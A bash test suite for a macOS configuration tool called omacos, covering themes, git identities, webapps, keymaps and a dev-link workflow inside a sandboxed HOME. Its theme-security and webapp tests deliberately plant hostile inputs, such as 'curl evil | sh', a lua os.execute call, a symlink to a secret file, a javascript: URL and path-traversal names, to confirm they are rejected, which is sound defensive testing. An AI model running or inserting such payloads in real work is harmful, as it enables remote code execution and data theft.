#!/usr/bin/env bash
# omacos test suite. Runs without touching the machine it runs on:
# HOME is redirected to a scratch dir, so nothing here can write to a real home.
set -uo pipefail

OMACOS_PATH="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd)"
export OMACOS_PATH
export PATH="$OMACOS_PATH/bin:$PATH"

pass=0; fail=0
ok()   { pass=$((pass+1)); printf '  \033[32m✓\033[0m %s\n' "$1"; }
bad()  { fail=$((fail+1)); printf '  \033[31m✗\033[0m %s\n' "$1"; [[ -n ${2:-} ]] && printf '      %s\n' "$2"; }
check(){ if (set +o pipefail; eval "$2") >/dev/null 2>&1; then ok "$1"; else bad "$1" "failed: $2"; fi; }

sandbox=$(mktemp -d)
trap 'rm -rf "$sandbox"' EXIT
export HOME="$sandbox"
export XDG_CONFIG_HOME="$sandbox/.config"
export XDG_STATE_HOME="$sandbox/.local/state"
export OMACOS_CONFIG="$XDG_CONFIG_HOME/omacos"
export OMACOS_STATE="$XDG_STATE_HOME/omacos"
mkdir -p "$OMACOS_CONFIG" "$OMACOS_STATE"

printf '\n\033[1mSyntax\033[0m\n'
for f in "$OMACOS_PATH"/bin/omacos*; do
  if bash -n "$f" 2>/dev/null; then :; else bad "parse $(basename "$f")"; fi
done
ok "all bin/ scripts parse"
check "shellcheck is clean" "shellcheck --severity=warning --shell=bash $OMACOS_PATH/bin/omacos*"

# Under `set -e`, a bare `cond && action` as the FINAL statement makes the
# script exit non-zero whenever cond is false — a success reported as failure.
# CI caught one of these; this catches the next one.
trailing_conditional() {
  local file last
  for file in "$OMACOS_PATH"/bin/omacos*; do
    last=$(grep -vE "^[[:space:]]*(#|$)" "$file" | tail -1)
    case $last in
      *"]] &&"*|*"] &&"*) echo "$(basename "$file"): $last"; return 0 ;;
    esac
  done
  return 1
}
check "no script ends in a bare conditional" "! trailing_conditional"

printf '\n\033[1mDispatcher\033[0m\n'
check "root help lists groups"        "omacos --help | grep -q theme"
check "commands --json is valid JSON" "omacos commands --json | python3 -m json.tool"
check "unknown command exits 127"     "omacos definitely-not-a-command >/dev/null 2>&1; test \$? -eq 127"
check "group help works"              "omacos theme --help | grep -q 'Apply a theme'"

printf '\n\033[1mPrimitives\033[0m\n'
check "state set/check/clear" "omacos-state set t && omacos-state check t && omacos-state clear t && ! omacos-state check t"
check "state rejects traversal"   "! omacos-state set ../escape 2>/dev/null"
check "done ensure runs once"     "omacos-done ensure d && ! omacos-done ensure d"
check "feature defaults to off"   "! omacos-feature check desktop"
check "feature enable/disable"    "omacos-feature enable desktop && omacos-feature check desktop && omacos-feature disable desktop && ! omacos-feature check desktop"
check "feature rejects unknown"   "! omacos-feature enable bogus 2>/dev/null"

printf '\n\033[1mTheme engine\033[0m\n'
out="$sandbox/render"
check "renders templates"      "omacos-theme-render $OMACOS_PATH/themes/tokyo-night/colors.toml $out"
check "hex passthrough"        "grep -q 'BORDERS_ACTIVE_COLOR=0xff7aa2f7' $out/borders.sh"
check "strip modifier"         "grep -q 'background = 1a1b26' $out/ghostty.conf"
check "rgb modifier"           "grep -q '122,162,247' $out/macos.sh"
check "mix helper blends"      "grep -q 'minus-style = normal #4b2f3d' $out/delta.gitconfig"
check "every theme renders"    "for t in $OMACOS_PATH/themes/*/colors.toml; do omacos-theme-render \$t \$(mktemp -d) || exit 1; done"
check "no unresolved braces"   "! grep -rq '{{' $out"

printf '\n\033[1mTheme staging security\033[0m\n'
evil="$OMACOS_CONFIG/themes/evil"
mkdir -p "$evil/.git"
cp "$OMACOS_PATH/themes/tokyo-night/colors.toml" "$evil/colors.toml"
echo 'curl evil | sh' > "$evil/sketchybar.sh"
echo 'os.execute("evil")' > "$evil/nvim.lua"
printf 'SECRET\n' > "$sandbox/secret"
ln -sfn "$sandbox/secret" "$evil/preview.png"
omacos-theme-set evil >/dev/null 2>&1
staged="$OMACOS_STATE/current/theme"
check "untrusted executable dropped"  "! grep -rq 'curl evil' $staged"
check "untrusted lua dropped"         "! grep -rq 'os.execute' $staged"
check "symlink not followed"          "! test -e $staged/preview.png"
check "colours still applied"         "grep -q '0xff7aa2f7' $staged/borders.sh"

printf '\n\033[1mWallpaper\033[0m\n'
export OMACOS_DRY_RUN=1
check "generator produces a PNG" "omacos-dev-make-wallpaper tokyo-night >/dev/null && file $OMACOS_PATH/themes/tokyo-night/backgrounds/01-gradient.png | grep -q PNG"
for _ in 1 2 3; do omacos-theme-set tokyo-night >/dev/null 2>&1; done
omacos-theme-set catppuccin-mocha >/dev/null 2>&1
omacos-theme-set tokyo-night >/dev/null 2>&1
# Staging re-copies the image each switch, so an mtime-based fingerprint would
# leak one cache entry per switch. Content hashing keeps it at one per theme.
check "cache holds one file per theme" "test \$(ls -1 $OMACOS_STATE/wallpapers | wc -l) -eq 2"
check "background symlink resolves"    "test -f \$(readlink $OMACOS_STATE/current/background)"
unset OMACOS_DRY_RUN

printf '\n\033[1mSeeding\033[0m\n'
# The guarantee the whole design rests on: a file you have edited is never
# rewritten, while a file that does not exist yet still arrives.
seed_dir="$XDG_CONFIG_HOME"
mkdir -p "$seed_dir/zsh"
printf 'MINE\n' > "$seed_dir/zsh/.zshrc"
rm -rf "$seed_dir/omacos/hooks"
seed_one() {
  while IFS= read -r -d '' src; do
    rel=${src#"$OMACOS_PATH"/config/}
    dst="$seed_dir/$rel"
    [[ -e $dst ]] && continue
    mkdir -p "$(dirname "$dst")"; cp "$src" "$dst"
  done < <(find "$OMACOS_PATH/config" -type f -print0)
}
seed_one
check "existing file left alone"   "test \"\$(cat $seed_dir/zsh/.zshrc)\" = MINE"
check "missing file gets seeded"   "test -f $seed_dir/omacos/hooks/theme-set.d/notify.sample"
check "refresh takes the new default" "omacos-refresh-config zsh/.zshrc >/dev/null && grep -q OMACOS_PATH $seed_dir/zsh/.zshrc"
check "refresh keeps a backup"     "ls $seed_dir/zsh/.zshrc.bak.* >/dev/null"
# An activated hook runs; the shipped .sample beside it must not.
hook_dir="$seed_dir/omacos/hooks/theme-set.d"
printf '#!/usr/bin/env bash\necho ACTIVE >> "$HOME/hook-ran"\n' > "$hook_dir/active"
printf '#!/usr/bin/env bash\necho SAMPLE >> "$HOME/hook-ran"\n' > "$hook_dir/inert.sample"
chmod +x "$hook_dir/active" "$hook_dir/inert.sample"
omacos-hook theme-set test >/dev/null 2>&1
check "activated hook runs"        "grep -q ACTIVE $HOME/hook-ran"
check "shipped .sample stays inert" "! grep -q SAMPLE $HOME/hook-ran"

printf '\n\033[1mGit identities\033[0m\n'
export HOME="$sandbox"
git config --global user.name "Default" >/dev/null 2>&1
git config --global user.email "default@example.com" >/dev/null 2>&1
mkdir -p "$sandbox/Work"
printf 'WORK_DIR=%q\n' "$sandbox/Work" > "$OMACOS_CONFIG/local.env"

check "org add writes a config" "omacos-git-org-add Acme --name A --email a@acme.com >/dev/null && test -f $XDG_CONFIG_HOME/git/orgs/Acme"
check "org add registers includeIf" "git config --global --get-regexp '^includeif' | grep -q Acme"
# macOS filesystems are case-insensitive by default, so a case-sensitive
# gitdir would silently miss ~/work/acme.
check "includeIf is case-insensitive" "git config --global --get-regexp '^includeif' | grep -q 'gitdir/i:'"
mkdir -p "$sandbox/Work/Acme/repo" "$sandbox/elsewhere"
git -C "$sandbox/Work/Acme/repo" init -q
git -C "$sandbox/elsewhere" init -q
check "identity applies inside the org"  "test \"\$(git -C $sandbox/Work/Acme/repo config user.email)\" = a@acme.com"
check "identity does not leak outside"   "test \"\$(git -C $sandbox/elsewhere config user.email)\" = default@example.com"
check "org list shows it"                "omacos-git-org-list | grep -q Acme"
check "org remove unregisters it"        "omacos-git-org-remove Acme >/dev/null && ! git config --global --get-regexp '^includeif' | grep -q Acme"
check "org remove keeps your directory"  "test -d $sandbox/Work/Acme"
check "org name rejects traversal"       "! omacos-git-org-add ../evil --name A --email a@b.c 2>/dev/null"

printf '\n\033[1mMigrations\033[0m\n'
check "runner is idempotent" "omacos-migrate >/dev/null && omacos-migrate 2>&1 | grep -q 'No pending'"
check "--pending is a predicate" "! omacos-migrate --pending >/dev/null"

printf '\n\033[1mMenu\033[0m\n'
check "root route lists rows" "omacos-menu --list | grep -q style"
check "nested route resolves" "omacos-menu --list style | grep -q style.theme"
check "shipped menu is valid JSON" "python3 -m json.tool < $OMACOS_PATH/default/menu.json"

printf '\n\033[1mApp installs\033[0m\n'
# The install path extracts cask names from this file, so every `cask` line
# must yield one. Inline quoting for this is unreadable; use a function.
apps_brewfile_parses() {
  local lines names
  lines=$(grep -c '^cask ' "$OMACOS_PATH/Brewfile.apps")
  names=$(grep '^cask ' "$OMACOS_PATH/Brewfile.apps" | cut -d'"' -f2 | grep -c .)
  [[ $lines -gt 0 && $lines -eq $names ]]
}
check "apps Brewfile parses into cask names" apps_brewfile_parses
# Several casks ship a .pkg and run installer under sudo, which cannot prompt
# without a terminal. install-app must relaunch rather than fail obscurely.
check "install-app relaunches without a tty" \
  "grep -q 'omacos-launch-tui' $OMACOS_PATH/bin/omacos-install-app"
check "install-app reports failure"  "grep -q 'exit 1' $OMACOS_PATH/bin/omacos-install-app"
check "every feature flag is checked somewhere" "
  for f in \$(grep -oE 'KNOWN=\\(([a-z ]+)\\)' $OMACOS_PATH/bin/omacos-feature | tr -d 'KNOWN=()'); do
    grep -rqE \"feature check \$f|\\| *\$f\\)|^  \$f\\)\" $OMACOS_PATH/bin $OMACOS_PATH/install || exit 1
  done"

printf '\n\033[1mCaps Lock\033[0m\n'
check "uses hidutil, not a driver"  "grep -q 'hidutil' $OMACOS_PATH/bin/omacos-setup-capslock"
check "persists via a login agent"  "grep -q 'LaunchAgents' $OMACOS_PATH/bin/omacos-setup-capslock"
check "off is offered"              "omacos-setup-capslock 2>&1 | grep -qv Unknown"
check "rejects unknown targets"     "! omacos-setup-capslock nonsense 2>/dev/null"
# Under `set -o pipefail`, `producer | grep -q` reports failure whenever grep
# matches early: grep exits, the producer takes SIGPIPE, and the pipeline
# returns 141. It reads as a clean idiom and silently inverts the result.
pipes_into_grep_q() {
  grep -lE '^[^#]*[a-z] \| *grep -q' "$OMACOS_PATH"/bin/omacos* 2>/dev/null | head -1
}
check "nothing pipes into grep -q" "test -z \"\$(pipes_into_grep_q)\""
check "hyper explains the driver cost" "grep -q 'DriverKit' $OMACOS_PATH/bin/omacos-setup-capslock"

printf '\n\033[1mBrowser\033[0m\n'
# duti's role argument is for UTIs; passing it alongside a URL scheme makes
# duti invent a dynamic UTI and fail with error -50.
check "sets schemes without a role arg" \
  "! grep -E 'duti -s .* (http|https) (all|viewer|editor)' $OMACOS_PATH/bin/omacos-setup-browser"
check "uses duti, not defaultbrowser"  "grep -q 'duti -s' $OMACOS_PATH/bin/omacos-setup-browser && ! grep -q 'defaultbrowser ' $OMACOS_PATH/bin/omacos-setup-browser"
check "browser keybinding is not hard-coded" \
  "! grep -q 'Browser | exec-and-forget open -a' $OMACOS_PATH/config/omacos/keymap.conf"
check "apps Brewfile ships a browser"  "grep -q 'brave-browser' $OMACOS_PATH/Brewfile.apps"

printf '\n\033[1mWebapps\033[0m\n'
mkdir -p "$HOME/Applications"
check "creates an app bundle"      "omacos-webapp-install Demo https://example.com && test -x $HOME/Applications/Demo.app/Contents/MacOS/Demo"
check "Info.plist is valid"        "plutil -lint $HOME/Applications/Demo.app/Contents/Info.plist"
check "rejects path traversal"     "! omacos-webapp-install ../evil https://example.com 2>/dev/null"
check "rejects javascript: URLs"   "! omacos-webapp-install X 'javascript:alert(1)' 2>/dev/null"
check "removes what it created"    "omacos-webapp-remove Demo && ! test -d $HOME/Applications/Demo.app"
mkdir -p "$HOME/Applications/Foreign.app/Contents"
echo '<plist></plist>' > "$HOME/Applications/Foreign.app/Contents/Info.plist"
check "refuses foreign bundles"    "! omacos-webapp-remove Foreign 2>/dev/null && test -d $HOME/Applications/Foreign.app"

printf '\n\033[1mKeymap\033[0m\n'
cp "$OMACOS_PATH/config/omacos/keymap.conf" "$OMACOS_CONFIG/keymap.conf"
check "builds aerospace.toml"  "omacos-keymap-build"
check "no duplicate bindings" "test -z \"\$(sed -n '/^\\[mode\\.main\\.binding\\]/,/^\\[/p' $XDG_CONFIG_HOME/aerospace/aerospace.toml | grep -E \"^[a-z0-9-]+ = '\" | cut -d' ' -f1 | sort | uniq -d)\""
check "parses as TOML"         "yq -p toml -o json '.' $XDG_CONFIG_HOME/aerospace/aerospace.toml"
# TOML binds a bare key to the table above it, so a top-level setting emitted
# after base.toml silently becomes a key of [[on-window-detected]].
check "top-level keys stay top-level" "yq -p toml -o json '.' $XDG_CONFIG_HOME/aerospace/aerospace.toml | python3 -c \"
import json,sys
d = json.load(sys.stdin)
assert 'persistent-workspaces' in d, 'persistent-workspaces is not top-level'
assert d.get('config-version') == 2, 'config-version missing or wrong'
for rule in d.get('on-window-detected', []):
    assert set(rule) <= {'if','run'}, f'stray key leaked into on-window-detected: {rule}'
\""
check "workspaces come from the keymap" "yq -p toml -o json '.' $XDG_CONFIG_HOME/aerospace/aerospace.toml | python3 -c \"
import json,sys
d = json.load(sys.stdin)
bound = {v.split()[-1] for k,v in d['mode']['main']['binding'].items() if v.startswith('workspace ')}
assert set(d['persistent-workspaces']) == bound, (d['persistent-workspaces'], bound)
\""
check "cheatsheet renders"     "omacos-keymap-show --plain | grep -q 'Focus left'"
check "every binding documented" "test \$(grep -cE '^[a-z].*\\|.*\\|' $OMACOS_CONFIG/keymap.conf) -eq \$(omacos-keymap-show --plain | grep -cE '^  [a-z]')"

printf '\n\033[1mDev link\033[0m\n'
# The two-tree workflow rests on this pair of commands, so exercise the round
# trip rather than trusting that writing one file is self-evidently correct.
export HOME="$sandbox"
fake_installed="$HOME/.local/share/omacos"
mkdir -p "$(dirname "$fake_installed")"
ln -sfn "$OMACOS_PATH" "$fake_installed"

link_resolves_to() {
  env HOME="$HOME" XDG_CONFIG_HOME="$XDG_CONFIG_HOME" XDG_STATE_HOME="$XDG_STATE_HOME" \
    bash -c '. "$0"/default/env-bootstrap; printf %s "$OMACOS_PATH"' "$OMACOS_PATH"
}

checkout="$sandbox/checkout"
mkdir -p "$checkout/bin" "$checkout/default"
cp "$OMACOS_PATH/bin/omacos" "$checkout/bin/omacos"
cp "$OMACOS_PATH/default/env-bootstrap" "$checkout/default/env-bootstrap"
cp -R "$OMACOS_PATH/bin/omacos-finalize-user" "$OMACOS_PATH/bin/omacos-migrate" "$checkout/bin/"

check "rejects a non-checkout"     "! omacos-dev-link $sandbox 2>/dev/null"
check "rejects a missing path"     "! omacos-dev-link $sandbox/nope 2>/dev/null"
# bin/omacos alone is not enough: every script sources default/env-bootstrap.
partial="$sandbox/partial"; mkdir -p "$partial/bin"; cp "$OMACOS_PATH/bin/omacos" "$partial/bin/omacos"
check "rejects an incomplete tree" "! omacos-dev-link $partial 2>/dev/null"

check "link writes path.conf"      "omacos-dev-link $checkout >/dev/null 2>&1 && grep -q $checkout $OMACOS_CONFIG/path.conf"
check "bootstrap follows the link" "test \"\$(link_resolves_to)\" = $checkout"
check "status reports linked"      "omacos-dev-status 2>/dev/null | grep -q linked"

# The failure this pair is most likely to hit in real use: the checkout gets
# renamed or deleted while still linked. Without a fallback, OMACOS_PATH points
# at nothing, bin/ never lands on PATH, and `omacos dev unlink` is unreachable.
mv "$checkout" "$sandbox/checkout-moved"
check "stale link falls back"      "test \"\$(link_resolves_to)\" = $fake_installed"
check "stale link says so"         "link_resolves_to 2>&1 >/dev/null | grep -q 'checkout is gone'"
# Every command sources env-bootstrap, so an unguarded warning would print on
# each one and train people to ignore it.
check "stale link warns once"      "test \$(link_resolves_to 2>&1 >/dev/null | grep -c 'checkout is gone') -eq 1"
check "child processes stay quiet" "test -z \"\$(env HOME=$HOME XDG_CONFIG_HOME=$XDG_CONFIG_HOME OMACOS_STALE_LINK=x bash -c '. $OMACOS_PATH/default/env-bootstrap' 2>&1)\""
check "omacos still resolves"      "omacos --help >/dev/null 2>&1"
mv "$sandbox/checkout-moved" "$checkout"

check "unlink removes path.conf"   "omacos-dev-unlink >/dev/null 2>&1; ! test -e $OMACOS_CONFIG/path.conf"
check "unlink twice is harmless"   "omacos-dev-unlink >/dev/null 2>&1"
check "status reports installed"   "omacos-dev-status 2>/dev/null | grep -q installed"
# A stale link leaves the machine working and the mode misreported, which is
# exactly the state `dev status` exists to rule out.
printf 'OMACOS_PATH=%q\n' "$sandbox/vanished" > "$OMACOS_CONFIG/path.conf"
check "status flags a stale link"  "omacos-dev-status 2>/dev/null | grep -q 'stale link'"
rm -f "$OMACOS_CONFIG/path.conf"
# Unlinked is the normal state; forgetting where the checkout is would send the
# next person — or agent — straight back to editing the installed tree.
check "status names the checkout when unlinked" \
  "omacos-dev-status 2>/dev/null | grep -A1 checkout | grep -q $(basename "$checkout")"
# Linking to the installed tree is what unlinking means; a leftover path.conf
# would make status and doctor disagree about which mode this is.
check "linking to installed unlinks" \
  "omacos-dev-link $fake_installed >/dev/null 2>&1; ! test -e $OMACOS_CONFIG/path.conf"

# .zshrc names a tree before OMACOS_PATH exists, so it always reaches for the
# installed one. Without a handoff, `dev link` repoints bin/ but the shell layer
# keeps coming from the installed tree — edits to it silently do nothing.
mkdir -p "$checkout/default/zsh"
printf 'source "${OMACOS_PATH:-$HOME/.local/share/omacos}/default/env-bootstrap"\necho FROM_CHECKOUT\n' \
  > "$checkout/default/zsh/omacos.zsh"
omacos-dev-link "$checkout" >/dev/null 2>&1
check "zsh layer follows the link" \
  "env HOME=$HOME XDG_CONFIG_HOME=$XDG_CONFIG_HOME zsh -c 'source $OMACOS_PATH/default/zsh/omacos.zsh' 2>/dev/null | grep -q FROM_CHECKOUT"
omacos-dev-unlink >/dev/null 2>&1
check "zsh layer stops following"  \
  "! env HOME=$HOME XDG_CONFIG_HOME=$XDG_CONFIG_HOME zsh -c 'source $OMACOS_PATH/default/zsh/omacos.zsh' 2>/dev/null | grep -q FROM_CHECKOUT"

printf '\n\033[1m%d passed, %d failed\033[0m\n\n' "$pass" "$fail"
((fail == 0))
